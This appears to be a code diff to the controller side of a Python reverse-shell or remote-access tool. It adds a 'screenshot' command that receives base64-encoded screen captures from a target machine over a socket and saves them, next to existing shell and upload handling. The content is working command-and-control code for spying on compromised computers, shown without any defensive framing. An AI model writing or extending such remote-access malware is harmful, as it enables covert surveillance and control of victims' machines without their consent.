@@ -1,5 +1,6 @@
 import json
 import struct
+import base64
 def send_frame(target,data):
     prefix = struct.pack(">I", len(data))
     target.send(prefix)
@@ -60,6 +61,13 @@ def start_shell(target_socket,target_ip):
                     print(e)
                     failed = "UPLOAD_FAIL"
                     reliable_send(target_socket, failed)
+            elif cmd[:10] == "screenshot":
+                file_data = receive_frame(target_socket)
+                if file_data == "SCREENSHOT_FAIL":
+                    print("Screenshot Failed")
+                else:
+                    with open("screenshot","wb") as f:
+                        f.write(base64.b64decode(file_data))
         except Exception as e:
             print(str(e))
         message = receive_frame(target_socket)
